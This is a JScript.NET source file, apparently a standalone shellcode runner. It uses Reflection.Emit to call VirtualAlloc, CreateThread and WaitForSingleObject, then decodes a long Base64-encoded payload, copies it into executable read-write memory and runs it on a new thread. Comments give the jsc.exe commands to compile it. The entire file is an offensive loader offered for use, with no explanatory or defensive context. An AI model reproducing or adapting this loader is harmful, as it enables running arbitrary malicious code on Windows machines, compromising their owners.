import System;
import System.Runtime.InteropServices;
import System.Reflection;
import System.Reflection.Emit;
import System.Runtime;
import System.Text;
 
//C:\Windows\Microsoft.NET\Framework\v2.0.50727\jsc.exe Shellcode.js
//C:\Windows\Microsoft.NET\Framework\v4.0.30319\jsc.exe Shellcode.js
 
function InvokeWin32(dllName:String, returnType:Type,
  methodName:String, parameterTypes:Type[], parameters:Object[])
{
  // Begin to build the dynamic assembly
  var domain = AppDomain.CurrentDomain;
  var name = new System.Reflection.AssemblyName('PInvokeAssembly');
  var assembly = domain.DefineDynamicAssembly(name, AssemblyBuilderAccess.Run);
  var module = assembly.DefineDynamicModule('PInvokeModule');
  var type = module.DefineType('PInvokeType',TypeAttributes.Public + TypeAttributes.BeforeFieldInit);
 
  // Define the actual P/Invoke method
  var method = type.DefineMethod(methodName, MethodAttributes.Public + MethodAttributes.HideBySig + MethodAttributes.Static + MethodAttributes.PinvokeImpl, returnType, parameterTypes);
 
  // Apply the P/Invoke constructor
  var ctor = System.Runtime.InteropServices.DllImportAttribute.GetConstructor([Type.GetType("System.String")]);
  var attr = new System.Reflection.Emit.CustomAttributeBuilder(ctor, [dllName]);
  method.SetCustomAttribute(attr);
 
  // Create the temporary type, and invoke the method.
  var realType = type.CreateType();
  return realType.InvokeMember(methodName, BindingFlags.Public + BindingFlags.Static + BindingFlags.InvokeMethod, null, null, parameters);
}
 
function VirtualAlloc( lpStartAddr:UInt32, size:UInt32, flAllocationType:UInt32, flProtect:UInt32)
{
	var parameterTypes:Type[] = [Type.GetType("System.UInt32"),Type.GetType("System.UInt32"),Type.GetType("System.UInt32"),Type.GetType("System.UInt32")];
	var parameters:Object[] = [lpStartAddr, size, flAllocationType, flProtect];
	
	return InvokeWin32("kernel32.dll", Type.GetType("System.IntPtr"), "VirtualAlloc", parameterTypes,  parameters );
}

function CreateThread( lpThreadAttributes:UInt32, dwStackSize:UInt32, lpStartAddress:IntPtr, param:IntPtr, dwCreationFlags:UInt32, lpThreadId:UInt32)
{
	var parameterTypes:Type[] = [Type.GetType("System.UInt32"),Type.GetType("System.UInt32"),Type.GetType("System.IntPtr"),Type.GetType("System.IntPtr"), Type.GetType("System.UInt32"), Type.GetType("System.UInt32") ];
	var parameters:Object[] = [lpThreadAttributes, dwStackSize, lpStartAddress, param, dwCreationFlags, lpThreadId ];
	
	return InvokeWin32("kernel32.dll", Type.GetType("System.IntPtr"), "CreateThread", parameterTypes,  parameters );
}

function WaitForSingleObject( handle:IntPtr, dwMiliseconds:UInt32)
{
	var parameterTypes:Type[] = [Type.GetType("System.IntPtr"),Type.GetType("System.UInt32")];
	var parameters:Object[] = [handle, dwMiliseconds ];
	
	return InvokeWin32("kernel32.dll", Type.GetType("System.IntPtr"), "WaitForSingleObject", parameterTypes,  parameters );
}

function ShellCodeExec()
{
	var MEM_COMMIT:uint = 0x1000;
	var PAGE_EXECUTE_READWRITE:uint = 0x40;

	var shellcodestr:String = '/XHg0OFx4MzFceGM5XHg0OFx4ODFceGU5XHgzOVx4ZmZceGZmXHhmZlx4NDhceDhkXHgwNVx4ZWZceGZmXHhmZlx4ZmZceDQ4XHhiYlx4NDNceGVlXHg2MVx4NjFceDZkXHg3M1x4YTJceDZiXHg0OFx4MzFceDU4XHgyN1x4NDhceDJkXHhmOFx4ZmZceGZmXHhmZlx4ZTJceGY0XHgwYlx4ZGZceGE4XHgyOVx4ZWNceDlhXHg5Y1x4OTRceGJjXHgxMVx4MjlceGVjXHg2OFx4OWNceDVkXHg5NFx4YmNceGE2XHhkYVx4MDFceDY0XHg1Ylx4NDdceGUwXHhjYVx4MGJceDVhXHgyOVx4NWNceDJiXHg4NVx4MjNceDZlXHgxNlx4OWVceDllXHg5Mlx4OTFceDU2XHg0M1x4N2JceDBmXHhjY1x4NmJceDBkXHhkNVx4NjZceGY0XHhiNVx4OGVceDA5XHhlZlx4MGJceDY5XHg2Nlx4ZjRceDAyXHg3ZFx4ZmJceGYxXHhhYlx4YTBceDk5XHg3Ylx4NmFceGNkXHhjY1x4ZGJceGJjXHhiMVx4ZDFceDI2XHhiMlx4MzlceDdiXHgxNVx4MDZceDYyXHhhZVx4MjFceGNjXHhiOFx4MDVceDczXHg4Y1x4NjJceDE5XHhlZlx4NGRceDdkXHg4MVx4NzVceDNiXHg2Mlx4MTlceDU4XHhiZVx4ZjFceGJkXHgxM1x4ZjFceDdmXHgyNVx4MjBceGY4XHhiOFx4YjVceGMyXHhlM1x4ZDVceGNiXHhlOFx4ZmFceDBmXHg3Ylx4NzhceDMwXHhkNFx4ZWVceDUwXHg3OFx4OTNceGFlXHhlN1x4YzZceDYzXHgyMFx4ZDFceGJkXHgxN1x4YThceDU1XHhjNlx4NjNceDk3XHgyMlx4MmVceDM1XHhlMFx4ZGVceDJmXHhjYlx4NWVceDc4XHg3OFx4MjNceDFmXHg4ZFx4NzFceGIxXHgyN1x4NjZceGNmXHhlZFx4YTVceDVlXHg2Zlx4OGFceGIxXHhhNVx4YTdceGFjXHg5NFx4YjRceGQ4XHg0NFx4MzBceDYwXHgyM1x4YWFceDM5XHhiNFx4ZDhceGYzXHhjM1x4MDhceDM1XHhmMVx4MDRceGZjXHgwMFx4YWJceDBhXHhhNVx4MTdceDFkXHhlMVx4MDNceDBhXHg0M1x4ODdceDEyXHhkOVx4YTdceDMyXHhlNlx4MDVceGM2XHhmMlx4ZGJceGU4XHgwMlx4NGJceDUxXHhjYlx4NDdceDM3XHg1Zlx4ZWVceGFhXHg0Ylx4NTFceDdjXHhiNFx4ODNceGFkXHhiZFx4MjVceDFiXHgzMlx4ZTBceGEyXHhmMlx4NmJceDU5XHg3Mlx4ZmNceDgzXHhjY1x4ZjBceDQ1XHhhNVx4ZTNceGExXHhjNVx4NjhceDQxXHgzN1x4OTRceDJmXHg4OVx4MDdceDcyXHhhNlx4YzBceGYyXHgxMFx4MjlceDJhXHgwN1x4NzJceDExXHgzM1x4NDJceDMxXHhiNVx4MTZceDMwXHg4Zlx4ZWZceGUzXHgzN1x4MjRceDllXHhmMlx4YjBceGEwXHhhMVx4NzdceDgwXHhlYVx4MjRceDIxXHg4ZFx4OThceGUzXHgwM1x4MzZceGZlXHgxMVx4NDFceDNhXHg1Nlx4NjJceGM2XHhiMlx4ZjhceDhmXHg0MVx4M2FceGUxXHg5MVx4YjJceGMzXHhmM1x4OGFceDBkXHhmZlx4MjJceDA5XHgwM1x4ODZceDRmXHg1N1x4ZjZceGU4XHg1MVx4ZDVceGI0XHg0OFx4ZjVceDg0XHgwZlx4ODBceDg0XHg5OFx4NzlceDY0XHhmYVx4YWNceGI4XHg0ZVx4MDVceDVkXHhmZFx4NjJceDYzXHhhY1x4YjhceGY5XHhmNlx4NGZceDMxXHgyYlx4MzhceGJmXHhiMVx4NWZceGJiXHg5OFx4YzlceGQ1XHhiYlx4MWJceDZhXHg0OVx4YjJceDJmXHgwN1x4NmZceDY4XHg4NFx4YmZceGRlXHhhMVx4YmRceGU3XHgwOFx4OTVceDMzXHg3MVx4NWZceDY0XHgzOVx4ZTFceDljXHg5NVx4MzNceGM2XHhhY1x4OTRceDFiXHg3Nlx4YjhceGFiXHg3Zlx4MzZceGZiXHhhMVx4MGRceDU2XHg0NFx4MjJceGUxXHg3Nlx4ZThceDE2XHhjM1x4ZWNceDk3XHg1Zlx4ZGFceDNmXHg4NFx4YTlceDY2XHhjNlx4NzBceGU4XHgxNFx4YmVceDQxXHgyZFx4NjBceDQ5XHg3MFx4ZThceGEzXHg0ZFx4MmJceDkyXHhhMlx4MThceDkwXHg3ZVx4OWRceDUwXHg4NFx4MTlceGQ3XHg5MVx4YzdceDNhXHgxM1x4MDlceDMzXHhkN1x4NmRceDQyXHgyMFx4OWNceDBmXHgxMFx4NTJceGE4XHg4Y1x4ZWZceDk3XHg1Mlx4OGVceGQ1XHhkNlx4YWVceDA2XHhlZlx4OTdceGU1XHg3ZFx4NmVceDYzXHgzYVx4YjRceGUxXHhhYVx4NDJceGM5XHgxMFx4ZTJceDE5XHhkZVx4NThceDQ1XHg1NVx4MzlceGE3XHgyY1x4YTNceDBkXHg2ZVx4ZTlceDFmXHhjM1x4MjhceGY4XHhkNFx4MDlceGQ5XHgyN1x4OWVceDA2XHhhY1x4ZmVceDUxXHgwOVx4ZDlceDkwXHg2ZFx4ZTdceDEzXHg3Mlx4YjNceDYxXHg0Mlx4MjZceDkzXHhjM1x4OThceDQ5XHg4OVx4YmVceDBiXHgyMFx4MjlceDc0XHg1Nlx4ZjNceDVhXHhkMlx4YWRceDcyXHg4M1x4OWRceDI0XHg5MFx4MTRceDY1XHg2M1x4ZjNceDQ2XHgxOVx4MjJceDEwXHgxNFx4NjVceGQ0XHgwMFx4ZTVceGE0XHhjN1x4YTFceDU4XHhmNVx4ZDhceDUzXHg4M1x4MmRceDk1XHhjOFx4YTNceGI3XHg2NFx4NDRceDM0XHhlM1x4MmZceDFiXHg4ZFx4MTNceDVmXHhiZFx4ZjlceDlhXHgwZFx4ZjhceDNhXHhkZFx4ZGVceDc4XHg3ZFx4OWNceDc2XHhmOFx4M2FceDZhXHgyZFx4NTJceGZhXHgyY1x4ZDRceDI5XHhjOVx4YjRceGEyXHhiZFx4NDlceDJiXHhhZVx4NGZceGU4XHhkYVx4NjlceDBhXHg4N1x4OTFceDdkXHhlOFx4NzZceGI0XHg4M1x4NWFceDlkXHg2Y1x4NDJceDVmXHhiOFx4MzVceDQ2XHhkZVx4OWJceDFhXHg0Mlx4NWZceDBmXHhjNlx4MDVceGY4XHg4ZVx4MmVceDExXHhhMlx4ZDNceDNlXHg4M1x4ZWFceDJjXHhjMlx4ZjVceDhkXHhiZlx4ODJceDM0XHgyNFx4OTZceDExXHgzYlx4YjJceDc0XHhmZVx4ZTZceDMwXHg2ZVx4NTlceDhjXHg3Y1x4ZjVceDNiXHg2Mlx4MzZceDFmXHg1OVx4OGNceGNiXHgwNlx4ZTBceDZkXHhkY1x4MzNceDM0XHhlOFx4NmVceGE3XHhmZVx4NTZceDgxXHhjN1x4ZWVceDVlXHg3Ylx4NDJceDQ5XHg5OFx4M2JceDE0XHhiOFx4NDhceDRmXHgyNlx4YTVceDE1XHhhN1x4MDVceDBmXHg4Nlx4Y2VceGUzXHgyMVx4MTNceGNiXHgwNVx4MGZceDMxXHgzZFx4YzFceGIyXHg0YVx4ZDFceGJmXHhlY1x4OThceDJiXHgyNlx4MTVceGE0XHgxM1x4YjJceGRkXHg4MVx4NzlceDkxXHhkYlx4MWVceGMwXHgxZFx4NTdceDA2XHgyYlx4YWFceGQxXHg4NVx4NjZceGFhXHg5OVx4ODdceGVlXHgyZVx4ZDdceGUyXHg2Nlx4YWFceDJlXHg3NFx4ZDBceGQ0XHg5M1x4NDlceGU4XHhkMFx4ZGNceDk3XHgyYlx4MWFceDYwXHgzYVx4ZDFceDc4XHg5ZVx4MzBceDljXHhkNFx4ZGFceGU5XHg2Mlx4OWJceDA0XHhkM1x4OTNceDQ3XHgxZlx4YmFceGQ1XHg1NVx4ODVceDE2XHgxN1x4NDFceDdkXHhiYVx4ZDVceGUyXHg3Nlx4NGJceDI5XHg3YVx4ZTZceGJiXHhmZVx4MGJceGJkXHhkM1x4MjNceGY2XHhhNVx4MGRceDA3XHg1Mlx4MzJceDY0XHhlZFx4NGNceDc2XHhkZFx4MjBceGI3XHhlMVx4ZTRceDJmXHhhZFx4MGRceDZhXHhlZVx4MzZceDI0XHg2MFx4MjlceGYwXHgwZFx4NmFceDU5XHhjNVx4MGFceDI0XHhhMVx4M2RceDhhXHg2Nlx4MDBceDE3XHhlMVx4NTRceDllXHgyOFx4YmFceGI4XHhlOVx4ODFceDU2XHg5YVx4MjRceGZiXHgxOVx4ZTVceGJmXHgwNFx4NTBceDdmXHg3MFx4OTlceGFlXHgyYlx4M2VceGMxXHhkNFx4NzlceDI4XHg5OVx4YWVceDljXHhjZFx4OWZceDExXHg0OFx4NjZceGM4XHhlNVx4YmJceDc3XHgwNFx4ZTBceGNlXHhmMFx4MmVceDdjXHgyY1x4ODlceGIzXHgyZVx4NzRceDIzXHhmZFx4YTBceGMzXHg4Zlx4NjNceDhjXHg1NVx4MjlceDRhXHg2ZVx4NDJceDRhXHhlN1x4OGFceDA2XHgyOVx4NGFceGQ5XHhiMVx4MzdceGU4XHg2OFx4NzFceDcwXHg5Mlx4M2RceDgwXHg4Zlx4ZDNceDNkXHhkZVx4OWVceDk4XHg2OVx4ZjVceDM4XHgxZFx4ODdceDBkXHg2ZVx4OGVceDU1XHhjYVx4ZTBceDJjXHg3OFx4OGNceGQ5XHg0MFx4ZDRceDBmXHg2NFx4MmFceDM2XHg4Y1x4ZDlceGY3XHgyN1x4ZDNceGQzXHhlNFx4ZGNceGY2XHgxNFx4YWZceGEwXHhjYVx4NTBceDlkXHhlZVx4M2JceDBiXHg0N1x4NjNceDdkXHg5ZVx4MjdceDNkXHhkZVx4ZGNceDFkXHg2ZFx4ZjdceGJiXHgxZFx4ZjVceDIyXHg5NFx4ZGZceGQ4XHg0Nlx4MDNceDg3XHhhNFx4NzRceGRjXHhhZlx4NWJceDYyXHgxYlx4NWVceGE3XHg0Mlx4ZGNceDE1XHhkYlx4MWZceDFiXHg1ZVx4YTdceDAyXHhkY1x4MTVceGZiXHg1N1x4MWJceGRhXHg0Mlx4NjhceGRlXHhkM1x4YjhceGNlXHgxYlx4ZTRceDM1XHg4ZVx4YThceGZmXHhmNVx4MDVceDdmXHhmNVx4YjRceGUzXHg1ZFx4OTNceGM4XHgwNlx4OTJceDM3XHgxOFx4NzBceGQ1XHhjZlx4YzFceDhjXHgwMVx4ZjVceDdlXHg2MFx4YThceGQ2XHg4OFx4ZDdceDM1XHg1NFx4OGRceDNhXHg5Zlx4OWNceGZjXHg3NVx4ZDhceDU1XHg3ZFx4MjJceDk0XHg5ZVx4YzFceDgyXHg5M1x4YTFceDkyXHg2YVx4OTVceDRlXHhkOVx4OGNceDFiXHhjZFx4YjFceGE5XHhkNFx4YmVceGMwXHgwNlx4ODNceDM2XHhhM1x4NmFceDZiXHg1N1x4YzhceDhjXHg2N1x4NWRceGJkXHgyM1x4NDJceGQzXHhiOFx4Y2VceDFiXHhlNFx4MzVceDhlXHhkNVx4NWZceDQwXHgwYVx4MTJceGQ0XHgzNFx4MWFceDc0XHhlYlx4NzhceDRiXHg1MFx4OTlceGQxXHgyYVx4ZDFceGE3XHg1OFx4NzJceDhiXHg4ZFx4YjFceGE5XHhkNFx4YmFceGMwXHgwNlx4ODNceGIzXHhiNFx4YTlceDk4XHhkNlx4Y2RceDhjXHgxM1x4YzlceGJjXHgyM1x4NDRceGRmXHgwMlx4MDNceGRiXHg5ZFx4ZjRceGYyXHhkNVx4YzZceGM4XHg1Zlx4MGRceDhjXHhhZlx4NjNceGNjXHhkZlx4ZDBceDQ2XHgwOVx4OWRceDc2XHhjZVx4YjRceGRmXHhkYlx4ZjhceGIzXHg4ZFx4YjRceDdiXHhjZVx4ZDZceDAyXHgxNVx4YmFceDlhXHgwYVx4ZGRceDZiXHhjM1x4ZTNceDA3XHgxYVx4NmJceDgyXHg0Ylx4ZmFceGY3XHhlN1x4NjJceDI3XHhkNVx4YjRceDc0XHhkZFx4MTdceDZmXHg0Ylx4ZGFceDI0XHhiNFx4OThceGQ4XHhlOVx4YWZceDAwXHhhY1x4MDBceDFkXHhhMlx4OTRceDllXHg4OVx4NGFceDNjXHhhZlx4OWNceDRlXHhmOFx4ZmZceGE2XHgzMlx4N2RceGU1XHhkNVx4MGFceGMzXHhmN1x4ZTdceDYzXHgzY1x4YTJceDg2XHgwMlx4ZGFceGNhXHhhOVx4MzFceDdkXHhlNFx4Y2VceDAyXHhjM1x4ZDFceGRlXHgzMVx4NjdceGVlXHhkNVx4NzZceGU2XHhmN1x4ZWRceDYyXHgzZFx4YTFceGRhXHgxNVx4YmFceGFlXHhiMlx4MjdceDIxXHhhM1x4Y2ZceDEzXHhhNVx4YjBceGI5XHgyZVx4NzNceGI5XHg5Y1x4NDlceGYxXHhiZVx4Y2VceDYyXHgzMFx4YmVceDlhXHgyMlx4Y2NceGM2XHhkMVx4NWZceDBiXHg4ZFx4YWRceDdhXHhjY1x4YzZceGQxXHg1Zlx4MGJceDhkXHhhZFx4N2FceGNjXHhjNlx4ZDFceDVmXHgwYlx4OGRceGFkXHg3YVx4Y2NceGM2XHhkMVx4NWZceDBiXHg4ZFx4YWRceDdhXHhjY1x4YzZceGQxXHg1Zlx4MGJceDhkXHhhZFx4N2FceGNjXHhjNlx4ZDFceDVmXHgwYlx4OGRceGFkXHg3YVx4Y2NceGM2XHhkMVx4NWZceDBiXHg4ZFx4YWRceDdhXHhjY1x4YzZceDg5XHg1ZVx4MWJceGU0XHgyN1x4NmZceGE1XHg1ZVx4YzRceDM2XHg5YVx4OTRceGE1XHg2M1x4YzRceGRmXHgzM1x4M2RceDA1XHhhY1x4NTJceGRkXHg0MVx4NzVceGU4XHg1ZFx4MWJceDVjXHgzNFx4NjNceDJjXHhjZVx4ODlceDA3XHg1M1x4OThceGM0XHhlYlx4ZDVceGNmXHhjOFx4NTZceDM5XHhkNlx4YjRceDczXHhkNVx4MjRceGRlXHg4ZVx4Y2NceDEzXHgwYVx4ZjdceDdmXHhkYVx4YzFceDhlXHg5Mlx4OWRceGM0XHhmMFx4ZDVceGM2XHhjNFx4MzZceDlhXHg4N1x4OWRceDIyXHg5Nlx4ZmVceDBkXHg1NVx4MDFceDk0XHg0Zlx4YzlceGMxXHhiMFx4YjJceGY4XHg4Nlx4OWRceDdjXHhlNFx4ZmVceDk0XHhkNlx4NGZceGRhXHgyNFx4YmRceDEzXHg0Nlx4ZDNceGI4XHhjN1x4MWVceGU0XHgzY1x4NzBceGM2XHhkZlx4MzNceDJhXHg1NVx4Y2RceDhlXHhkZFx4NDFceDFiXHg0OVx4NzJceDRlXHg5ZFx4MGFceGVkXHhlMFx4OGVceDYyXHhkOFx4YjhceGI2XHgxZFx4OTVceDZiXHg2MVx4NzZceDI4XHgxNVx4OWNceGFmXHg1Nlx4OTRceDllXHhjOFx4YjlceGEzXHg2MFx4NTdceDc0XHg2Ylx4NGJceGMxXHgzNlx4OWFceDZmXHhmNVx4MjJceGQ0XHg5ZVx4YzhceGJmXHg1M1x4YzVceGY1XHgyMlx4ZDVceDI3XHhjOVx4MDdceDUzXHhkNVx4YjRceDk4XHhjY1x4M2FceGRhXHhlMlx4YWNceDAwXHhiZFx4YjFceGM3XHhjZFx4YzFceDhlXHhiNFx4OWRceDdjXHhkM1x4ZGNceDE3XHg1M1x4NDZceGViXHhkNVx4ZDVceDIyXHg5NFx4ZDdceDAwXHhmZVx4MTJceDZmXHhlN1x4YjRceDFkXHg3Y1x4NzZceGQyXHgxYlx4NTZceDMxXHgwMlx4MTFceDVlXHhmZFx4YjFceDM1XHg1ZVx4ZjJceDZhXHg5NVx4NWRceDBjXHhjN1x4MjZceDAyXHhhZFx4N2FceDU3XHg3Nlx4YmNceGY4XHhhY1x4MmFceDkxXHgxMFx4ZTdceGU2XHhlMVx4NmZceDMwXHhiNFx4Y2RceDQ3XHhmOFx4ZmJceGJlXHg2Mlx4N2RceGI2XHg5OVx4NGRceGUxXHhmYVx4ZWZceDc1XHgzY1x4YmJceDgxXHgwY1x4ZmFceGZiXHhmZFx4MDdceDUzXHhkNVx4ZjVceDczXHhkNlx4NjZceGYyXHg0NVx4OTlceGZhXHhhNlx4YmRceDA3XHhlYlx4ZjZceDEwXHg4Zlx4NmFceDUzXHhiZVx4ZjhceGI0XHg0Ylx4MzlceDlkXHg5OVx4NmI=';	
	var shellcode:Byte[] = System.Convert.FromBase64String(shellcodestr);
	var funcAddr:IntPtr = VirtualAlloc(0, UInt32(shellcode.Length),MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	
	Marshal.Copy(shellcode, 0, funcAddr, shellcode.Length);
	var hThread:IntPtr = IntPtr.Zero;
	var threadId:UInt32 = 0;
	// prepare data
	var pinfo:IntPtr = IntPtr.Zero;
	// execute native code
	hThread = CreateThread(0, 0, funcAddr, pinfo, 0, threadId);
	WaitForSingleObject(hThread, 0xFFFFFFFF);

}

ShellCodeExec();
